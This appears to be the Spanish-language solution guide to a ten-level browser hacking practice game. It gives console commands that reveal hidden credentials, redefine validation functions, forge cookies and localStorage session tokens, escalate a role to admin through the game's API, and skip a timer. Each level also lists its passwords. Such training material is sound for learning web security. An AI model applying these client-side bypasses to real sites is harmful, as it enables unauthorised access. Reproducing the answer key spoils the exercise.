01 Inspección Básica LOCAL
▶
Concepto

La contraseña está escondida en un comentario HTML del código fuente.

Solución

1. Abre DevTools (F12) → pestaña Elements

2. Busca el comentario HTML que dice DEBUG CREDENTIALS

3. La contraseña es:

SecureCorp2024!

4. Escríbela en el campo de contraseña y haz clic en "Iniciar Sesión".

02 Variables Expuestas LOCAL
▶
Concepto

Las credenciales están guardadas en variables JavaScript globales.

Solución

1. Abre la consola (F12 → Console)

2. Escribe:

ADMIN_PASSWORD

3. La consola mostrará: Byt3Bl0g_S3cr3t!

4. Úsala para hacer login.

03 El Botón Fantasma BACKEND
▶
Concepto

Hay un botón oculto con display: none en el CSS.

Solución

1. Abre la consola y escribe:

document.getElementById('secret-access-btn').style.display = 'block'

2. El botón aparecerá abajo de la página. Haz clic en él.

04 Desactivado BACKEND
▶
Concepto

El botón de registro tiene el atributo HTML disabled.

Solución

1. Abre la consola y escribe:

document.getElementById('registerBtn').disabled = false

2. El botón se activa. Haz clic en "Registrarse".

05 Validación Rota BACKEND
▶
Concepto

La función validateAccess() siempre devuelve false. Hay que redefinirla.

Solución

1. En la consola, redefine la función:

validateAccess = function() { return true }

2. Haz clic en "Verificar Acceso" (puedes escribir cualquier cosa).

06 Cookie Monster API NIVEL
▶
Concepto

El valor de la cookie no es "admin". Está oculto en los headers de respuesta de un endpoint de la API.

Paso 1 — Obtener el valor secreto
fetch('https://breakthis.logise1123.workers.dev/api/level/6/config')
  .then(r => {
    console.log(r.headers.get('X-Admin-Cookie-Value'))
    // Resultado: xK9_r00t_4cc3ss
  })
Paso 2 — Establecer la cookie
document.cookie = "role=xK9_r00t_4cc3ss"
Paso 3

Haz clic en "Verificar Permisos".

07 Token Falsificado API NIVEL
▶
Concepto

El token necesita un campo pin que solo el servidor conoce. Se obtiene con un header Authorization.

Paso 1 — Obtener el pin
fetch('https://breakthis.logise1123.workers.dev/api/level/7/pin', {
  headers: { 'Authorization': 'Bearer breakthis' }
}).then(r=>r.json()).then(console.log)
// Resultado: { pin: 7341 }
Paso 2 — Crear el token en localStorage
localStorage.setItem('neobank_session',
  JSON.stringify({
    user: "admin",
    role: "superuser",
    pin: 7341
  })
)
Paso 3

Haz clic en "Verificar Sesión".

08 Escalada de Privilegios API NIVEL
▶
Concepto

Cambiar el rol a "admin" no basta. También necesitas un código de acceso del servidor.

Paso 1 — Cambiar el rol
window.currentUser.role = "admin"
Paso 2 — Obtener el código de acceso
fetch('https://breakthis.logise1123.workers.dev/api/level/8/access-code', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ role: "admin" })
}).then(r=>r.json()).then(console.log)
// Resultado: { access_code: "pr1v_3sc_x7" }
Paso 3 — Guardar el código
window.accessCode = "pr1v_3sc_x7"
Paso 4

Haz clic en "Comprobar Permisos".

09 Mensaje Cifrado API NIVEL
▶
Concepto

La contraseña no está en el HTML. Hay que pedirla al servidor (codificada en Base64) y decodificarla.

Paso 1 — Obtener el cipher
fetch('https://breakthis.logise1123.workers.dev/api/level/9/cipher')
  .then(r=>r.json()).then(console.log)
// Resultado: { cipher: "U2g0ZDB3X1ByMHQwYzBsIQ==", encoding: "base64" }
Paso 2 — Decodificar
atob("U2g0ZDB3X1ByMHQwYzBsIQ==")
// Resultado: "Sh4d0w_Pr0t0c0l!"
Paso 3

Introduce Sh4d0w_Pr0t0c0l! en el campo de contraseña y pulsa Enter.

10 Contra Reloj BACKEND
▶
Concepto

Un temporizador de 5 minutos bloquea el acceso. Hay múltiples formas de saltarlo.

Opción A — Llamar directamente a la función
unlockVault()
Opción B — Poner el timer a 0
window.timeLeft = 0

Espera 1 segundo a que se actualice y haz clic en "Abrir Bóveda".

Opción C — Parar el timer y forzar
clearInterval(window.countdownTimer)
window.timeLeft = 0
unlockVault()
